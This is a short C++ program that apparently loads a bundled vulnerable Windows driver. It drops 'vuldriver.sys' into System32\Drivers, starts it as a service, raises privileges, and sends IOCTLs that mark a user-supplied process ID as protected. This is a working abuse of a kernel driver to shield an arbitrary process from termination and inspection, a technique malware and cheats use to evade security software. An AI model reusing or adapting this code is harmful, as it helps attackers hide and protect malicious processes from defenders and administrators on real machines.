#include "includes.h"
#include "vuldriver.h"

bool CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size)
{
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size))
	{
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	return true;
}

int main(int argc, char** argv) {

	if (argc < 2) {
		printf("INVALID USAGE: [PID_TO_PROTECT]\n");
		system("pause"); exit(-1);
	}

	CreateFileFromMemory("C:\\Windows\\System32\\Drivers\\vuldriver.sys", (const char*)driver, sizeof(driver));
	printf("Created Driver at C:\\Windows\\System32\\Drivers\\vuldriver.sys\n");
	if (service::create("C:\\Windows\\System32\\Drivers\\vuldriver.sys")) {
		printf("Started Service\n");
		HANDLE driverhandle;
		if (privs::raise_and_gethandle(SE_TCB_NAME, &driverhandle)) {
			printf("Got handle to Driver: %x\n", driverhandle);
			DWORD to_protect = std::stoi(argv[1]); //First arg due to processhacker start
			printf("Protecting: %x\n", to_protect);
			DeviceIoControl(driverhandle, 0x22e048, &to_protect, sizeof(to_protect), 0, 0, 0, 0);
			printf("Called add_to_list\n");
			DeviceIoControl(driverhandle, 0x22e050, 0, 0, 0, 0, 0, 0);
			printf("Called init\n");
			printf("[->] Your process + %x is now protected\n", to_protect);
		}
	}
	printf("Press Enter to unload Driver and unregister Service\n");
	system("pause");
	service::close("EQProtect");
	exit(-1);
}